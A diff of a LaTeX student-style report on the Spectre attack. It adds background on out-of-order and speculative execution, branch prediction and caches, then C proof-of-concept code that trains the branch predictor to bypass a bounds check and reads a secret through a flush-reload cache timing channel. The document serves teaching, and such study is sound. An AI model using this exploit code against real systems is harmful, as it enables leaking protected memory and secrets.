@@ -118,10 +118,51 @@ I hope that you find this template both visually appealing and useful. \\
 
 \section{Baby Steps/Background}
 \subsection{Out of order Execution}
+\textbf{Out of order execution} is a paradigm in which instructions are executed not in the order of how they appear but on the \textbf{input data and execution units availiability} to the processor for their execution. This is a commonly used approach in high performing processors. Clearly, this approach efficiently uses the instruction cycles and reduces the cost delay of executing a program.  
+\subsubsection{More details}
+The earlier processors( \textbf{in-order executive} ) differ from an \textbf{OoOE ( out of order executive)} processor in processing an instruction as follows. An inorder processor fetches the instruction, waits for it's inputs and availiability of execution units and then executes the instruction. It finally writes the result of instruction into the appropriate register in the register file. 
+
+In contrast, OoOE processors breaks up the processing of instructions into these steps:
+\begin{enumerate}
+	\item Fetch the instruction.
+	\item Dispatch it to an instruction queue.
+	\item Executes the instructions in the queue based on the availiability of data and execution units.
+	\item The results are queued and are written to the register file in the order of appearance.
+\end{enumerate}
+
+Note that the execution of instructions in step 3 doesn't follow the program order of instruction. 
+This results in utilising, otherwise stalled clock cycles. The processor finally rearranges the result in the order of appearance to make it appear that it processed them in order. 
+
+Further, modern processor uses some decoupling techinques such as renaming of registers and a certain \textbf{VLIW} architechture to effectively use this paradigm.
+
+   The take away point is that modern processors are mostly OoOE and they execute instructions out of order for efficiency. 
+  
 \subsection{Speculation Execution}
+When a processor encounters a branch instruction whose branching condition is not yet evaluated ( generally, because this instruction is being executed out of order), the \textbf{speculative execution paradigm} allows the processor to make a guess and take the branch and starts executing. \\
+The cpu has to store it's register state before it speculatively executes. In case it comes to know that the branch it started evaluating isn't the right one, it reverts back to the saved state. With a good brach prediction algorithm, clearly, this paradigm greatly improves the execution time of a program with many branch instructions. 
+
+Let us see some of the mechanisms for prediction employed in modern-day processors.  
 \subsection{Branch Prediction}
+In general, processors predict the following for preventing stalls 
+\begin{enumerate}
+	\item The target address of \textit{ direct calls and jumps }.  
+	\item The target address of \textit{ indirect calls and jumps }.
+	\item The target address of \textit{ conditional branches }.
+\end{enumerate}
+Processors also contain a component called \textbf{Branch Target Buffer (BTB) } which keeps a mapping from addresses of recently executed branch instructions to destination addresses. The processors refer to the BTB during the \textbf{I-state} of the \textbf{instruction pipeline cycle} ( where the instructions are decoded) and predict the target address even before the instruction is executed.
+
+For conditional branching, as the target address is already encoded in the instruction, such mapping is not needed. Instead, the branch outcome history is used for predicting. Processors also uses the branch outcome history for predicting direct and indirect branches also. 
+
+It is to be noted that the above used branch-prediction logic is typically not shared across physical cores. Hence, the processor learns only from previous branches executed on the same core. This is useful information for an attacker.
+\newpage
 \subsection{The Memory Hierarchy}
+In general, the memory of the CPU is divided into three caches and an external memory and is \textbf{hierarchial}. This is to allow faster access time to the data essential to the process running on the CPU. The chain of access is passed from \textbf{L1} cache to \textbf{L2} cache, from \textbf{L2} to \textbf{L3} cache and then to external memory based on whether we recieve a hit on the presence of the required data among the caches. The L1 cache has the fastest  access time and this slows down as we move down this hierarchy. It is to noted that while each core has it's own L1 and L2 caches the L3 is common for the cores.
+
+The coherence of the L1 and L2 caches across the multiple cores is maintained by the cache coherence protocol that usually is dependant on \textbf{MESI(Modified-Exclusive-Shared-Invalid) Protocol}.
+
+Several properties of the cache coherency protocol such as \textbf{\textit{cache-line bouncing}}, \textbf{\textit{false sharing}} can sometimes be abused as a replacement for cache eviction using the \textbf{clflush instruction} or eviction patterns.
 \subsection{Microarchitectural Side-Channel Attacks/Flush-Reload Techniques}
+
 \subsection{Return Oriented Programming}
 \section{What is Spectre? Why is it more famous than me?}
 \subsection{General}
@@ -133,6 +174,17 @@ Spectre is a class of attacks that exploit security vulnerabilities in most mode
 \section{Proof of Concept Study}
 \section{The Experiment}
 \subsection{Experiment Setup}
+\subsubsection{Setting the context}
+\begin{lstlisting}[style=CStyle]
+unsigned int buffer_size = 10;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+uint8_t temp = 0;
+char* secret = "Some Secret Value";
+uint8_t array[256*4096];
+\end{lstlisting}
+buffer is accessible using restrictedAccess()
+secret is to be stolen
+array is helper(side channel) to steal secret  
 \subsubsection{Restricted Access}
 \begin{lstlisting}[style=CStyle]
 uint8_t restrictedAccess(size_t x)
@@ -145,18 +197,50 @@ uint8_t restrictedAccess(size_t x)
 	}
 }
 \end{lstlisting}
+This is a simple C function which gives access to elements within buffer\_ size and restricts access to locations outside buffer size by returning 0. This is the target of our attack. The aim is to extract information outside buffer\_size using this function 
 \subsubsection{Flush side channel}
 \begin{lstlisting}[style=CStyle]
 void flushSideChannel()
 {
 	int i;
-	// Write to array to bring it to RAM to prevent Copy-on-write
+	// Write to array to bring it to RAM to prevent On-Demand-Allocation
 	for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 0;
 		// Flush the values of the array from cache
 	for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
 }
 \end{lstlisting}
+Almost all Operating Systems implement a policy called \textbf{On-Demand-Allocation}. According to this policy the OS allocates memory to a process only if the process accesses it. Elements of array(line 4) are accessed and assigned 0(could be any value) to ensure that memory is allocated to array. Flushing the elements of array is required to ensure that all elements of array are brought to cache by the function spectreAttack during \textbf{speculative execution}(Look at section Spectre Attack for better understanding) \\
+There is no significance of DELTA. Any DELTA can be used.\\
+Only array elements present in different pages are used to ensure that they are present in different pages to overcome effects of prefetching \\
 
+\subsubsection{Spectre Attack}
+\begin{lstlisting}[style=CStyle]
+void spectreAttack(size_t larger_x)
+{
+	int i;
+	uint8_t s;
+	// Train the CPU to take the true branch inside victim().
+	for (i = 0; i < 10; i++) {
+		_mm_clflush(&buffer_size);
+		restrictedAccess(i);
+	}
+	// Flush buffer_size and array[] from the cache.
+	_mm_clflush(&buffer_size);
+	flushSideChannel();
+	// Ask victim() to return the secret in out-of-order execution.
+	s = restrictedAccess(larger_x);
+	array[s*4096 + DELTA] += 88;
+}
+\end{lstlisting}
+
+This function flushes buffer\_size and calls restrictedAccess() with elements within buffer\_size enough number of times. As restrictedAccess() requires buffer\_size to check if the access is valid and buffer\_size was flushed to memory(its not present in cache), it takes a lot of time to retrive buffer\_size. As most processors use branch predictors and as restrictedAccess() is called with valid index many times, the \textbf{branch predictor gets trained} to pridect \textbf{branch not taken} in the `if condition' of restrictedAccess().\\
+After this the function calls flushSideChannel() to ensure that all elements are brought to cache only during execution of line 15.\\
+Calling spectreAttack with a large value say larger\_x should ideally return 0, but because the buffer\_size is flushed and speculative execution predicts branch not taken the restrictedAccess(larger\_x) returns buffer[larger\_x] and if the statement in line 15 gets executed, $array[s*4096+DELTA]$ is brought to cache.\\
+Immediately after buffer\_size has arrived from memory the proccessor realizes that the speculative execution was wrong(by execution of if statement in restrictedAccess()) and reverts back everything that happened till this point.
+But this does not flush the element $array[s*4096+DELTA]$ from cache. 
+The current state is all the elements except $array[s*4096+DELTA]$ are present in main memory but $array[s*4096+DELTA]$ is present in the cache.   
+ 
+   
 \subsubsection{Reload Side Channel}
 \begin{lstlisting}[style=CStyle]
 static int scores[256];
@@ -177,29 +261,23 @@ void reloadSideChannel()
 }
 \end{lstlisting}
 
-\subsubsection{Spectre Attack}
-\begin{lstlisting}[style=CStyle]
-void spectreAttack(size_t larger_x)
-{
-	int i;
-	uint8_t s;
-	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
-	// Train the CPU to take the true branch inside victim().
-	for (i = 0; i < 10; i++) {
-		_mm_clflush(&buffer_size);
-		restrictedAccess(i);
-	}
-	// Flush buffer_size and array[] from the cache.
-	_mm_clflush(&buffer_size);
-	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
-	// Ask victim() to return the secret in out-of-order execution.
-	s = restrictedAccess(larger_x);
-	array[s*4096 + DELTA] += 88;
-}
-\end{lstlisting}
+This function brings all 256 elements to cache and measures the time taken for each element in doing so. As elements present in the cache take significantly less time compared to elements not present in cache. Since only elements of array accessed would be the result of speculative execution, the data present at buffer[larger\_x] can be determined.
+This function uses $\_\_rdtscp (\&junk)$ gives current time of CPU in some CPU uints.
+Line 10,11,12 finds the time taken to access addr which is $array[i*4096+DELTA]$ and
+$scores[i]$ stores the number of times $i^{th}$ element was brought to cache.
+CACHE\_HIT\_THRESHOLD is used to differentiate between elements already present in cache and those coming from main memory.
 
+  
 \subsection{Our Result}
-\subsection{Our Technique}
+
+We executed \textbf{spectreAttack()} immediately followed by \textbf{reloadSideChannel()} 1000 number of times and then found the element of array which was present in cache for the most number of times. The result is as follows.
+
+\vspace*{0.5 cm}
+	{\centering
+    \vspace*{0.5 cm}
+\includegraphics[scale = 0.6]{spectre.png}\\[1.0 cm]}
+
+
 \newpage
 \section{Mitigations}
 \subsection{Preventing Speculative Execution}
